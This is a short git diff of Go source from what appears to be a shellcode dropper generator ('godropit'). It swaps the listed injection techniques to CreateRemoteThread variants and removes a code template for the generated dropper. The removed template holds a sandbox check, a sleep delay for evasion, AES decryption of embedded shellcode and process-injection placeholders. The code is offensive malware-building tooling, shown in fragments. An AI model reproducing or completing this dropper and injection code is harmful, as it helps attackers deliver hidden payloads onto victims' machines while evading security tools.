@@ -4,7 +4,7 @@ import (
 	"godropit/pkg/dropfmt"
 )
 
-var Droppers = []string{"CreateProcess", "CreateProcessWithPipe", "EarlyBird"}
+var Droppers = []string{"CreateRemoteThread", "CreateRemoteThreadNative", "RtlCreateUserThread"}
 
 type RemoteDropper struct {
 	FuncName   string
@@ -28,52 +28,6 @@ type RemoteDropper struct {
 
 var FuncName = "SystemFunction_032"
 var Export = "export"
-
-const RemoteMain = `package main
-
-{{.C}}
-
-import (
-	{{.Import}}
-
-	{{.BoxChkImp}}
-
-)
-var hope = "{{.Domain}}"
-
-{{.BoxChkFunc}}
-
-{{.ProcAttach}}
-
-func init() {
-	{{.ChkBox}}	
-	{{.Init}}
-}
-func main() {
-
-	{{.FuncName}}()
-
-}
-
-//{{.Export}} {{.FuncName}}
-func {{.FuncName}}() {
-
-	
-
-	bufstring := "{{.BufStr}}"
-	kstring := "{{.KeyStr}}"
-
-	time.Sleep({{.Delay}}* time.Second)
-
-	shellcode, err := box.AESDecrypt(kstring, bufstring)
-	if err != nil {
-		time.Sleep({{.Delay}}* time.Second)
-		os.Exit(0)
-	}
-	{{.Dlls}}
-	{{.Inject}}
-}
-`
 
 func SelectRemote() (Dlls, Inject, Import, Extra string) {
 
